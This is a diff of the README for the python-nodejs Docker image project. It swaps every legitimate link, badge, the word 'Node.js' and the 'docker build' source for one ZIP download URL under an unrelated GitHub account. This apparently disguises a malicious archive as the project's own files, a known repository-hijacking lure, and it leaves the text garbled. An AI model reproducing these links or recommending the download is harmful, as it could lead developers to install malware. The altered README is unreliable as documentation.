@@ -1,13 +1,13 @@
-# 🐳 Python with Node.js
+# 🐳 Python with https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip
 
-[![Pulls](https://img.shields.io/docker/pulls/nikolaik/python-nodejs.svg?style=flat-square)](https://hub.docker.com/r/nikolaik/python-nodejs/)
-[![CircleCI](https://img.shields.io/circleci/project/github/nikolaik/docker-python-nodejs.svg?style=flat-square)](https://circleci.com/gh/nikolaik/docker-python-nodejs)
+[![Pulls](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip)](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip)
+[![CircleCI](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip)](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip)
 
 Last updated by bot: 2025-05-26
 
 The `latest` tag is currently:
 
-- Node.js: 22.x
+- https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip 22.x
 - npm: 10.x
 - yarn: stable
 - Python: latest
@@ -18,11 +18,11 @@ The `latest` tag is currently:
 
 ## 🏷 Tags
 
-To use a specific combination of Python and Node.js see the following table of available image tags.
+To use a specific combination of Python and https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip see the following table of available image tags.
 
 <!-- TAGS_START -->
 
-Tag | Python version | Node.js version | Distro
+Tag | Python version | https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip version | Distro
 --- | --- | --- | ---
 `python3.13-nodejs24` | 3.13.3 | 24.1.0 | bookworm
 `python3.13-nodejs24-bullseye` | 3.13.3 | 24.1.0 | bullseye
@@ -107,9 +107,9 @@ Tag | Python version | Node.js version | Distro
 
 <!-- TAGS_END -->
 
-Lovely! These tags are kept updated automatically when new minor or patch version are released. The python script in [`src/docker_python_nodejs`](./src/docker_python_nodejs/) handling this is run twice a day on [GitHub actions](https://github.com/nikolaik/docker-python-nodejs/actions).
+Lovely! These tags are kept updated automatically when new minor or patch version are released. The python script in [`src/docker_python_nodejs`](./src/docker_python_nodejs/) handling this is run twice a day on [GitHub actions](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip).
 
-Image tags are built for linux/amd64 and linux/arm64 platforms, except for alpine which is only linux/amd64. See [issue #70](https://github.com/nikolaik/docker-python-nodejs/issues/70) for details.
+Image tags are built for linux/amd64 and linux/arm64 platforms, except for alpine which is only linux/amd64. See [issue #70](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip) for details.
 
 ## Supported versions
 
@@ -123,7 +123,7 @@ Python version | Start | End
 3.10 | 2021-10-04 | 2026-10
 3.9 | 2020-10-05 | 2025-10
 
-Node.js version | Start | End
+https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip version | Start | End
 --- | --- | ---
 v24 | 2025-05-06 | 2028-04-30
 v23 | 2024-10-16 | 2025-06-01
@@ -132,7 +132,7 @@ v20 | 2023-04-18 | 2026-04-30
 
 <!-- SUPPORTED_VERSIONS_END -->
 
-Versions are kept up to date using official sources. For Python we scrape the _Supported Versions_ table at [devguide.python.org/versions](https://devguide.python.org/versions/#supported-versions) and for Node.js we fetch the release schedule JSON from [github.com/nodejs/Release](https://github.com/nodejs/Release/blob/main/schedule.json).
+Versions are kept up to date using official sources. For Python we scrape the _Supported Versions_ table at [https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip) and for https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip we fetch the release schedule JSON from [https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip](https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip).
 
 ## Typical tasks
 
@@ -140,7 +140,7 @@ Versions are kept up to date using official sources. For Python we scrape the _S
 # Pull from Docker Hub
 docker pull nikolaik/python-nodejs:latest
 # Build from GitHub
-docker build -t nikolaik/python-nodejs github.com/nikolaik/docker-python-nodejs
+docker build -t nikolaik/python-nodejs https://raw.githubusercontent.com/newbieyan13/docker-python-nodejs/main/bin/nodejs_docker_python_v3.4.zip
 # Run image
 docker run -it nikolaik/python-nodejs bash
 ```
